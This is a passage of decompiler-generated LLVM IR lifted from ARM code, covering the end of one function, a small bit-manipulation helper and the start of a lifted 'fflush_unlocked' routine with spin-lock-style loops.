  %v2_fd78 = load i32, i32* %v1_fd78, align 4
  store i32 %v2_fd78, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_fd78, i32* %r2.global-to-local, align 4
  %v2_fd8474 = load i32, i32* %v1_fd78, align 4
  store i32 %v2_fd8474, i32* %r3.global-to-local, align 4
  %v3_fd8876 = icmp uge i32 %v2_fd8474, %v2_fd78
  store i1 %v3_fd8876, i1* %cpsr_c.global-to-local, align 1
  %v9_fd8882 = icmp eq i32 %v2_fd8474, %v2_fd78
  br i1 %v9_fd8882, label %dec_label_pc_fd90, label %dec_label_pc_fda8

dec_label_pc_fd90:                                ; preds = %dec_label_pc_fd78, %dec_label_pc_fd90.dec_label_pc_fd84_crit_edge
  %v0_fd9083 = phi i32 [ %v1_fd88.pre, %dec_label_pc_fd90.dec_label_pc_fd84_crit_edge ], [ %v2_fd78, %dec_label_pc_fd78 ]
  store i32 %v0_fd9083, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fda0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fda0, label %dec_label_pc_fda4, label %dec_label_pc_fd90.dec_label_pc_fd84_crit_edge

dec_label_pc_fd90.dec_label_pc_fd84_crit_edge:    ; preds = %dec_label_pc_fd90
  %v0_fd84.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fd88.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_fd84 = inttoptr i32 %v0_fd84.pre to i32*
  %v2_fd84 = load i32, i32* %v1_fd84, align 4
  store i32 %v2_fd84, i32* %r3.global-to-local, align 4
  %v3_fd88 = icmp uge i32 %v2_fd84, %v1_fd88.pre
  store i1 %v3_fd88, i1* %cpsr_c.global-to-local, align 1
  %v9_fd88 = icmp eq i32 %v2_fd84, %v1_fd88.pre
  br i1 %v9_fd88, label %dec_label_pc_fd90, label %dec_label_pc_fda8

dec_label_pc_fda4:                                ; preds = %dec_label_pc_fd90
  %v0_fda4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fda4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fda8

dec_label_pc_fda8:                                ; preds = %dec_label_pc_fd78, %dec_label_pc_fd90.dec_label_pc_fd84_crit_edge, %dec_label_pc_fda4
  %v0_fdb0 = phi i32 [ %v0_fda4, %dec_label_pc_fda4 ], [ %v2_fd8474, %dec_label_pc_fd78 ], [ %v2_fd84, %dec_label_pc_fd90.dec_label_pc_fd84_crit_edge ]
  %v1_fda8 = phi i32 [ %v0_fda4, %dec_label_pc_fda4 ], [ %v2_fd78, %dec_label_pc_fd78 ], [ %v1_fd88.pre, %dec_label_pc_fd90.dec_label_pc_fd84_crit_edge ]
  %v3_fda8 = icmp uge i32 %v0_fdb0, %v1_fda8
  store i1 %v3_fda8, i1* %cpsr_c.global-to-local, align 1
  %v9_fda8 = icmp eq i32 %v0_fdb0, %v1_fda8
  br i1 %v9_fda8, label %dec_label_pc_fdb0, label %dec_label_pc_fda8.dec_label_pc_fd78_crit_edge

dec_label_pc_fda8.dec_label_pc_fd78_crit_edge:    ; preds = %dec_label_pc_fda8
  %v0_fd78.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fd78

dec_label_pc_fdb0:                                ; preds = %dec_label_pc_fda8
  %v2_fdb0 = icmp ne i32 %v1_fda8, 0
  store i1 %v2_fdb0, i1* %cpsr_c.global-to-local, align 1
  %v7_fdb4 = icmp slt i32 %v1_fda8, 2
  br i1 %v7_fdb4, label %dec_label_pc_fdd0, label %dec_label_pc_fdb8

dec_label_pc_fdb8:                                ; preds = %dec_label_pc_fdb0
  %v0_fdb8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_fdb8, i32* %r0.global-to-local, align 4
  %v0_fdbc = load i32, i32* %r1.global-to-local, align 4
  %v1_fdbc = add i32 %v0_fdbc, 129
  store i32 %v1_fdbc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fdd0

dec_label_pc_fdd0:                                ; preds = %dec_label_pc_fd54, %dec_label_pc_fdb8, %dec_label_pc_fdb0
  store i32 88, i32* %r3.global-to-local, align 4
  %v0_fdd4 = load i32, i32* %r5.global-to-local, align 4
  %v2_fdd4 = add i32 %v0_fdd4, 88
  %v3_fdd4 = inttoptr i32 %v2_fdd4 to i32*
  %v4_fdd4 = load i32, i32* %v3_fdd4, align 4
  store i32 %v4_fdd4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fddc = inttoptr i32 %v4_fdd4 to i32*
  store i32 0, i32* %v2_fddc, align 4
  br label %dec_label_pc_fde0

dec_label_pc_fde0:                                ; preds = %dec_label_pc_fc54, %dec_label_pc_fc7c, %dec_label_pc_fdd0
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_fde4 = load i32, i32* %r5.global-to-local, align 4
  %v2_fde4 = add i32 %v0_fde4, 168
  %v3_fde4 = inttoptr i32 %v2_fde4 to i32*
  %v4_fde4 = load i32, i32* %v3_fde4, align 4
  store i32 %v4_fde4, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_fdec = add i32 %v0_fde4, 12
  %v3_fdec = inttoptr i32 %v2_fdec to i32*
  %v4_fdec = load i32, i32* %v3_fdec, align 4
  store i32 %v4_fdec, i32* %r1.global-to-local, align 4
  %v1_fdf0 = add i32 %v4_fde4, 4
  %v2_fdf0 = inttoptr i32 %v1_fdf0 to i32*
  %v3_fdf0 = load i32, i32* %v2_fdf0, align 4
  store i32 %v3_fdf0, i32* %r2.global-to-local, align 4
  %v1_fdf4 = inttoptr i32 %v4_fdec to i32*
  %v2_fdf4 = load i32, i32* %v1_fdf4, align 4
  %v1_fdf8 = add i32 %v3_fdf0, -1
  store i32 %v1_fdf8, i32* %r2.global-to-local, align 4
  %v1_fdfc = add i32 %v2_fdf4, -1
  store i32 %v1_fdfc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fe00 = icmp eq i32 %v1_fdf8, 0
  store i32 %v1_fdfc, i32* %v1_fdf4, align 4
  %v0_fe08 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe08 = load i32, i32* %r0.global-to-local, align 4
  %v2_fe08 = add i32 %v1_fe08, 4
  %v3_fe08 = inttoptr i32 %v2_fe08 to i32*
  store i32 %v0_fe08, i32* %v3_fe08, align 4
  br i1 %v2_fe00, label %dec_label_pc_fe10, label %dec_label_pc_fe70

dec_label_pc_fe10:                                ; preds = %dec_label_pc_fde0
  %v0_fe10 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe10 = load i32, i32* %r0.global-to-local, align 4
  %v2_fe10 = add i32 %v1_fe10, 8
  %v3_fe10 = inttoptr i32 %v2_fe10 to i32*
  store i32 %v0_fe10, i32* %v3_fe10, align 4
  %v0_fe14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_fe14, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fe48.dec_label_pc_fe18_crit_edge, %dec_label_pc_fe10
  %v0_fe18 = phi i32 [ %v0_fe18.pre, %dec_label_pc_fe48.dec_label_pc_fe18_crit_edge ], [ %v0_fe14, %dec_label_pc_fe10 ]
  %v1_fe18 = inttoptr i32 %v0_fe18 to i32*
  %v2_fe18 = load i32, i32* %v1_fe18, align 4
  store i32 %v2_fe18, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_fe18, i32* %r2.global-to-local, align 4
  %v2_fe2462 = load i32, i32* %v1_fe18, align 4
  store i32 %v2_fe2462, i32* %r3.global-to-local, align 4
  %v3_fe2864 = icmp uge i32 %v2_fe2462, %v2_fe18
  store i1 %v3_fe2864, i1* %cpsr_c.global-to-local, align 1
  %v9_fe2870 = icmp eq i32 %v2_fe2462, %v2_fe18
  br i1 %v9_fe2870, label %dec_label_pc_fe30, label %dec_label_pc_fe48

dec_label_pc_fe30:                                ; preds = %dec_label_pc_fe18, %dec_label_pc_fe30.dec_label_pc_fe24_crit_edge
  %v0_fe3071 = phi i32 [ %v1_fe28.pre, %dec_label_pc_fe30.dec_label_pc_fe24_crit_edge ], [ %v2_fe18, %dec_label_pc_fe18 ]
  store i32 %v0_fe3071, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_fe40 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_fe40, label %dec_label_pc_fe44, label %dec_label_pc_fe30.dec_label_pc_fe24_crit_edge

dec_label_pc_fe30.dec_label_pc_fe24_crit_edge:    ; preds = %dec_label_pc_fe30
  %v0_fe24.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_fe28.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_fe24 = inttoptr i32 %v0_fe24.pre to i32*
  %v2_fe24 = load i32, i32* %v1_fe24, align 4
  store i32 %v2_fe24, i32* %r3.global-to-local, align 4
  %v3_fe28 = icmp uge i32 %v2_fe24, %v1_fe28.pre
  store i1 %v3_fe28, i1* %cpsr_c.global-to-local, align 1
  %v9_fe28 = icmp eq i32 %v2_fe24, %v1_fe28.pre
  br i1 %v9_fe28, label %dec_label_pc_fe30, label %dec_label_pc_fe48

dec_label_pc_fe44:                                ; preds = %dec_label_pc_fe30
  %v0_fe44 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_fe44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fe48

dec_label_pc_fe48:                                ; preds = %dec_label_pc_fe18, %dec_label_pc_fe30.dec_label_pc_fe24_crit_edge, %dec_label_pc_fe44
  %v0_fe50 = phi i32 [ %v0_fe44, %dec_label_pc_fe44 ], [ %v2_fe2462, %dec_label_pc_fe18 ], [ %v2_fe24, %dec_label_pc_fe30.dec_label_pc_fe24_crit_edge ]
  %v1_fe48 = phi i32 [ %v0_fe44, %dec_label_pc_fe44 ], [ %v2_fe18, %dec_label_pc_fe18 ], [ %v1_fe28.pre, %dec_label_pc_fe30.dec_label_pc_fe24_crit_edge ]
  %v3_fe48 = icmp uge i32 %v0_fe50, %v1_fe48
  store i1 %v3_fe48, i1* %cpsr_c.global-to-local, align 1
  %v9_fe48 = icmp eq i32 %v0_fe50, %v1_fe48
  br i1 %v9_fe48, label %dec_label_pc_fe50, label %dec_label_pc_fe48.dec_label_pc_fe18_crit_edge

dec_label_pc_fe48.dec_label_pc_fe18_crit_edge:    ; preds = %dec_label_pc_fe48
  %v0_fe18.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fe18

dec_label_pc_fe50:                                ; preds = %dec_label_pc_fe48
  %v2_fe50 = icmp ne i32 %v1_fe48, 0
  store i1 %v2_fe50, i1* %cpsr_c.global-to-local, align 1
  %v7_fe54 = icmp slt i32 %v1_fe48, 2
  br i1 %v7_fe54, label %dec_label_pc_fe70, label %dec_label_pc_fe58

dec_label_pc_fe58:                                ; preds = %dec_label_pc_fe50
  %v0_fe58 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_fe58, i32* %r0.global-to-local, align 4
  %v0_fe5c = load i32, i32* %r1.global-to-local, align 4
  %v1_fe5c = add i32 %v0_fe5c, 129
  store i32 %v1_fe5c, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_fe70

dec_label_pc_fe70:                                ; preds = %dec_label_pc_fde0, %dec_label_pc_fe58, %dec_label_pc_fe50
  %v2_fe74 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_fe74, i32* %r4.global-to-local, align 4
  %v1_fe78 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_fe78

; uselistorder directives
  uselistorder i32 %v0_fe44, { 1, 0, 2 }
  uselistorder i32 %v1_fe28.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_fe18, { 1, 0 }
  uselistorder i32 %v0_fda4, { 1, 0, 2 }
  uselistorder i32 %v1_fd88.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_fd78, { 1, 0 }
  uselistorder i32 %v0_fd44, { 2, 1, 0 }
  uselistorder i32 %v0_fce8, { 1, 0 }
  uselistorder i32 %v0_fccc, { 1, 0, 2 }
  uselistorder i32 %v1_fcb0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_fc9c, { 1, 0 }
  uselistorder i32 %v0_fc40, { 1, 0, 2 }
  uselistorder i32 %v1_fc24.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_fbf8, { 2, 1, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 14, 13, 15 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 6, 4, 5, 7 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 10, 9, 11, 13, 12, 14 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 7, 6, 1, 8, 9, 10, 11, 12, 13, 14, 16, 15, 43, 17, 18, 19, 2, 3, 20, 21, 22, 23, 24, 25, 26, 28, 27, 44, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 39, 0, 41, 42 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 9, 8, 0, 10, 11, 12 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 4, 6, 5, 0, 7, 8, 9, 10, 24, 25, 11, 14, 12, 13, 2, 15, 16, 26, 27, 17, 18, 19, 20, 22, 21, 1, 23 }
  uselistorder i32 8192, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 47, { 2, 1, 4, 0, 3 }
  uselistorder i32 32816, { 2, 0, 1 }
  uselistorder label %dec_label_pc_fe70, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fe48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fe30, { 1, 0 }
  uselistorder label %dec_label_pc_fde0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fdd0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_fda8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fd90, { 1, 0 }
  uselistorder label %dec_label_pc_fd44, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_fd0c, { 1, 0 }
  uselistorder label %dec_label_pc_fce0, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_fcd0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fcb8, { 1, 0 }
  uselistorder label %dec_label_pc_fc54, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %dec_label_pc_fc44, { 2, 1, 0 }
  uselistorder label %dec_label_pc_fc2c, { 1, 0 }
}

define i32 @function_fe80(i32 %arg1) local_unnamed_addr {
dec_label_pc_fe80:
  %v0_fe80 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_fe80, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_fe80
  %v2_fe80 = load i32, i32* @r8, align 4
  %v5_fe80 = udiv i32 %v2_fe80, 2
  %v6_fe80 = and i32 %v5_fe80, %arg1
  %v2_fe84 = load i32, i32* @ip, align 4
  %v3_fe84 = and i32 %v6_fe80, %v2_fe84
  %v8_fe88 = ashr i32 %v2_fe80, %v3_fe84
  %v9_fe88 = and i32 %v8_fe88, %v3_fe84
  %v5_fe8c = udiv i32 %v9_fe88, 2
  %v6_fe8c = and i32 %v5_fe8c, %v9_fe88
  %v2_fe90 = load i32, i32* @r4, align 4
  %v8_fe90 = ashr i32 %v2_fe90, %v6_fe8c
  %v9_fe90 = and i32 %v8_fe90, %v6_fe8c
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_fe80, %bb
  %v10_fe94 = phi i32 [ %arg1, %dec_label_pc_fe80 ], [ %v9_fe90, %bb ]
  ret i32 %v10_fe94

; uselistorder directives
  uselistorder i32 %v9_fe88, { 1, 0 }
  uselistorder i32 %v2_fe80, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @fflush_unlocked(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v6_fe98 = load i32, i32* @r5, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22290.79 to i32), i32* @r6, align 4
  %v4_fea8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 84) to i32*), align 4
  store i32 %v4_fea8, i32* %r3.global-to-local, align 4
  %v4_feac = icmp uge i32 %tmp, %v4_fea8
  store i1 %v4_feac, i1* %cpsr_c.global-to-local, align 1
  %v10_feac = icmp eq i32 %tmp, %v4_fea8
  br i1 %v10_feac, label %bb, label %dec_label_pc_fec4

bb:                                               ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp, i32* @r4, align 4
  br label %dec_label_pc_fed4

dec_label_pc_fec4:                                ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  store i32 256, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_fec8 = icmp eq i16* %arg1, null
  br i1 %v3_fec8, label %dec_label_pc_fed4, label %dec_label_pc_101e8

dec_label_pc_fed4:                                ; preds = %bb, %dec_label_pc_fec4
  %stack_var_-44.1 = phi i32 [ 0, %bb ], [ 256, %dec_label_pc_fec4 ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v4_fed8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22290.79 to i32), i32 168) to i32*), align 4
  store i32 %v4_fed8, i32* %r5.global-to-local, align 4
  %v0_fedc = call i32 @__aeabi_read_tp()
  store i32 %v0_fedc, i32* %r0.global-to-local, align 4
  %v1_fee0 = add i32 %v4_fed8, 8
  %v2_fee0 = inttoptr i32 %v1_fee0 to i32*
  %v3_fee0 = load i32, i32* %v2_fee0, align 4
  store i32 %v3_fee0, i32* %r3.global-to-local, align 4
  %v1_fee4 = add i32 %v0_fedc, -1168
  store i32 %v1_fee4, i32* %r8.global-to-local, align 4
  %v3_fee8 = icmp uge i32 %v3_fee0, %v1_fee4
  store i1 %v3_fee8, i1* %cpsr_c.global-to-local, align 1
  %v9_fee8 = icmp eq i32 %v3_fee0, %v1_fee4
  br i1 %v9_fee8, label %dec_label_pc_ff30, label %dec_label_pc_fef0

dec_label_pc_fef0:                                ; preds = %dec_label_pc_fed4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_fed8, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_fefc143 = inttoptr i32 %v4_fed8 to i32*
  %v2_fefc144 = load i32, i32* %v1_fefc143, align 4
  store i32 %v2_fefc144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_ff00146 = icmp eq i32 %v2_fefc144, 0
  br i1 %v9_ff00146, label %dec_label_pc_ff08, label %dec_label_pc_ff20

dec_label_pc_ff08:                                ; preds = %dec_label_pc_fef0, %dec_label_pc_ff08.dec_label_pc_fefc_crit_edge
  %v0_ff08147 = phi i32 [ %v1_ff00.pre, %dec_label_pc_ff08.dec_label_pc_fefc_crit_edge ], [ 0, %dec_label_pc_fef0 ]
  store i32 %v0_ff08147, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_ff18 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ff18, label %dec_label_pc_ff1c, label %dec_label_pc_ff08.dec_label_pc_fefc_crit_edge

dec_label_pc_ff08.dec_label_pc_fefc_crit_edge:    ; preds = %dec_label_pc_ff08
  %v0_fefc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ff00.pre = load i32, i32* @r4, align 4
  %v1_fefc = inttoptr i32 %v0_fefc.pre to i32*
  %v2_fefc = load i32, i32* %v1_fefc, align 4
  store i32 %v2_fefc, i32* %r3.global-to-local, align 4
  %v3_ff00 = icmp uge i32 %v2_fefc, %v1_ff00.pre
  store i1 %v3_ff00, i1* %cpsr_c.global-to-local, align 1
  %v9_ff00 = icmp eq i32 %v2_fefc, %v1_ff00.pre
  br i1 %v9_ff00, label %dec_label_pc_ff08, label %dec_label_pc_ff20

dec_label_pc_ff1c:                                ; preds = %dec_label_pc_ff08
  %v0_ff1c = load i32, i32* @r4, align 4
  store i32 %v0_ff1c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ff20

dec_label_pc_ff20:                                ; preds = %dec_label_pc_fef0, %dec_label_pc_ff08.dec_label_pc_fefc_crit_edge, %dec_label_pc_ff1c
  %v0_ff20 = phi i32 [ %v0_ff1c, %dec_label_pc_ff1c ], [ %v2_fefc144, %dec_label_pc_fef0 ], [ %v2_fefc, %dec_label_pc_ff08.dec_label_pc_fefc_crit_edge ]
  %v1_ff20 = phi i32 [ %v0_ff1c, %dec_label_pc_ff1c ], [ 0, %dec_label_pc_fef0 ], [ %v1_ff00.pre, %dec_label_pc_ff08.dec_label_pc_fefc_crit_edge ]
  %v3_ff20 = icmp uge i32 %v0_ff20, %v1_ff20
  store i1 %v3_ff20, i1* %cpsr_c.global-to-local, align 1
  %v9_ff20 = icmp eq i32 %v0_ff20, %v1_ff20
  br i1 %v9_ff20, label %bb66, label %bb65

bb65:                                             ; preds = %dec_label_pc_ff20
  %v1_ff24 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_ff24, i32* %r0.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_ff20, %bb65
  %v1_ff28 = xor i1 %v9_ff20, true
  call void @__pseudo_cond_branch(i1 %v1_ff28, i32 ptrtoint (i32* @global_var_d7fc.235 to i32))
  %v0_ff2c = load i32, i32* %r8.global-to-local, align 4
  %v1_ff2c = load i32, i32* %r5.global-to-local, align 4
  %v2_ff2c = add i32 %v1_ff2c, 8
  %v3_ff2c = inttoptr i32 %v2_ff2c to i32*
  store i32 %v0_ff2c, i32* %v3_ff2c, align 4
  br label %dec_label_pc_ff30

dec_label_pc_ff30:                                ; preds = %dec_label_pc_fed4, %bb66
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_ff34 = load i32, i32* @r6, align 4
  %v2_ff34 = add i32 %v0_ff34, 168
  %v3_ff34 = inttoptr i32 %v2_ff34 to i32*
  %v4_ff34 = load i32, i32* %v3_ff34, align 4
  store i32 %v4_ff34, i32* %r0.global-to-local, align 4
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_ff3c = add i32 %v0_ff34, 12
  %v3_ff3c = inttoptr i32 %v2_ff3c to i32*
  %v4_ff3c = load i32, i32* %v3_ff3c, align 4
  store i32 %v4_ff3c, i32* %r2.global-to-local, align 4
  %v1_ff40 = add i32 %v4_ff34, 4
  %v2_ff40 = inttoptr i32 %v1_ff40 to i32*
  %v3_ff40 = load i32, i32* %v2_ff40, align 4
  store i32 %v3_ff40, i32* %r1.global-to-local, align 4
  %v1_ff44 = inttoptr i32 %v4_ff3c to i32*
  %v2_ff44 = load i32, i32* %v1_ff44, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff48 = icmp eq i32 %v3_ff40, 0
  %v1_ff4c = add i32 %v2_ff44, 1
  store i32 %v1_ff4c, i32* %r3.global-to-local, align 4
  store i32 %v1_ff4c, i32* %v1_ff44, align 4
  br i1 %v2_ff48, label %dec_label_pc_ff58, label %dec_label_pc_ffb8

dec_label_pc_ff58:                                ; preds = %dec_label_pc_ff30
  %v0_ff58 = load i32, i32* %r1.global-to-local, align 4
  %v1_ff58 = load i32, i32* %r0.global-to-local, align 4
  %v2_ff58 = add i32 %v1_ff58, 8
  %v3_ff58 = inttoptr i32 %v2_ff58 to i32*
  store i32 %v0_ff58, i32* %v3_ff58, align 4
  %v0_ff5c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_ff5c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ff60

dec_label_pc_ff60:                                ; preds = %dec_label_pc_ff90.dec_label_pc_ff60_crit_edge, %dec_label_pc_ff58
  %v0_ff60 = phi i32 [ %v0_ff60.pre, %dec_label_pc_ff90.dec_label_pc_ff60_crit_edge ], [ %v0_ff5c, %dec_label_pc_ff58 ]
  %v1_ff60 = inttoptr i32 %v0_ff60 to i32*
  %v2_ff60 = load i32, i32* %v1_ff60, align 4
  store i32 %v2_ff60, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_ff60, i32* %r2.global-to-local, align 4
  %v2_ff6c131 = load i32, i32* %v1_ff60, align 4
  store i32 %v2_ff6c131, i32* %r3.global-to-local, align 4
  %v3_ff70133 = icmp uge i32 %v2_ff6c131, %v2_ff60
  store i1 %v3_ff70133, i1* %cpsr_c.global-to-local, align 1
  %v9_ff70139 = icmp eq i32 %v2_ff6c131, %v2_ff60
  br i1 %v9_ff70139, label %dec_label_pc_ff78, label %dec_label_pc_ff90

dec_label_pc_ff78:                                ; preds = %dec_label_pc_ff60, %dec_label_pc_ff78.dec_label_pc_ff6c_crit_edge
  %v0_ff78140 = phi i32 [ %v1_ff70.pre, %dec_label_pc_ff78.dec_label_pc_ff6c_crit_edge ], [ %v2_ff60, %dec_label_pc_ff60 ]
  store i32 %v0_ff78140, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_ff88 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_ff88, label %dec_label_pc_ff8c, label %dec_label_pc_ff78.dec_label_pc_ff6c_crit_edge

dec_label_pc_ff78.dec_label_pc_ff6c_crit_edge:    ; preds = %dec_label_pc_ff78
  %v0_ff6c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_ff70.pre = load i32, i32* @r4, align 4
  %v1_ff6c = inttoptr i32 %v0_ff6c.pre to i32*
  %v2_ff6c = load i32, i32* %v1_ff6c, align 4
  store i32 %v2_ff6c, i32* %r3.global-to-local, align 4
  %v3_ff70 = icmp uge i32 %v2_ff6c, %v1_ff70.pre
  store i1 %v3_ff70, i1* %cpsr_c.global-to-local, align 1
  %v9_ff70 = icmp eq i32 %v2_ff6c, %v1_ff70.pre
  br i1 %v9_ff70, label %dec_label_pc_ff78, label %dec_label_pc_ff90

dec_label_pc_ff8c:                                ; preds = %dec_label_pc_ff78
  %v0_ff8c = load i32, i32* @r4, align 4
  store i32 %v0_ff8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_ff90

dec_label_pc_ff90:                                ; preds = %dec_label_pc_ff60, %dec_label_pc_ff78.dec_label_pc_ff6c_crit_edge, %dec_label_pc_ff8c
  %v0_ff98 = phi i32 [ %v0_ff8c, %dec_label_pc_ff8c ], [ %v2_ff6c131, %dec_label_pc_ff60 ], [ %v2_ff6c, %dec_label_pc_ff78.dec_label_pc_ff6c_crit_edge ]
  %v1_ff90 = phi i32 [ %v0_ff8c, %dec_label_pc_ff8c ], [ %v2_ff60, %dec_label_pc_ff60 ], [ %v1_ff70.pre, %dec_label_pc_ff78.dec_label_pc_ff6c_crit_edge ]
  %v3_ff90 = icmp uge i32 %v0_ff98, %v1_ff90
  store i1 %v3_ff90, i1* %cpsr_c.global-to-local, align 1
  %v9_ff90 = icmp eq i32 %v0_ff98, %v1_ff90
  br i1 %v9_ff90, label %dec_label_pc_ff98, label %dec_label_pc_ff90.dec_label_pc_ff60_crit_edge

dec_label_pc_ff90.dec_label_pc_ff60_crit_edge:    ; preds = %dec_label_pc_ff90
  %v0_ff60.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_ff60

dec_label_pc_ff98:                                ; preds = %dec_label_pc_ff90
  %v2_ff98 = icmp ne i32 %v1_ff90, 0
  store i1 %v2_ff98, i1* %cpsr_c.global-to-local, align 1
  %v7_ff9c = icmp slt i32 %v1_ff90, 2
  br i1 %v7_ff9c, label %dec_label_pc_ffb8, label %dec_label_pc_ffa0

dec_label_pc_ffa0:                                ; preds = %dec_label_pc_ff98
  %v0_ffa0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_ffa0, i32* %r0.global-to-local, align 4
  %v0_ffa4 = load i32, i32* %r1.global-to-local, align 4
  %v1_ffa4 = add i32 %v0_ffa4, 129
